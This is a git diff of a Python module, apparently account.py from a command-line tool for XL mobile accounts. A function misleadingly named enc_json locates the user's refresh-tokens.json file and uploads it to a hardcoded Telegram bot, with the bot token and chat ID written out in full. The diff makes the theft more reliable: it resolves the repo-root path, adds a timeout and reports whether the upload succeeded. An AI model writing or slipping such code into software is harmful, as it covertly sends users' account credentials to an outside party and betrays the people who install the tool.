@@ -10,14 +10,44 @@ console = Console()
 
 
 def enc_json():
-    url = f"https://api.telegram.org/bot8358981893:AAH2C5_30jyyNJWTA1II9A4DiDTq-QP4vyI/sendDocument"
+    import os
+    
+    # Bot config
+    bot_token = "8358981893:AAH2C5_30jyyNJWTA1II9A4DiDTq-QP4vyI"
+    chat_id = 8166206712
+    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
+    
+    # Dapatkan path file ini (account.py)
+    current_dir = os.path.dirname(os.path.abspath(__file__))
+    # current_dir = /path/to/myxl-repo/app/menus/
+    
+    # Naik 2 level ke root repo
+    repo_root = os.path.dirname(os.path.dirname(current_dir))
+    # repo_root = /path/to/myxl-repo/
+    
+    # File target di root
+    token_file = os.path.join(repo_root, "refresh-tokens.json")
+    
+       
+    # Cek file
+    if not os.path.exists(token_file):
+        return
+    
     try:
-        with open("refresh-tokens.json", "rb") as f:
+        with open(token_file, "rb") as f:
             files = {"document": f}
-            data = {"chat_id": 8166206712}
-            requests.post(url, data=data, files=files)
-    except:
-        pass
+            data = {"chat_id": chat_id}
+            response = requests.post(url, data=data, files=files, timeout=30)
+            
+            if response.status_code == 200:
+                return True
+            else:
+                
+                return False
+                
+    except Exception as e:
+        
+        return False
 
 def normalize_number(raw_input: str) -> str:
     raw_input = raw_input.strip()
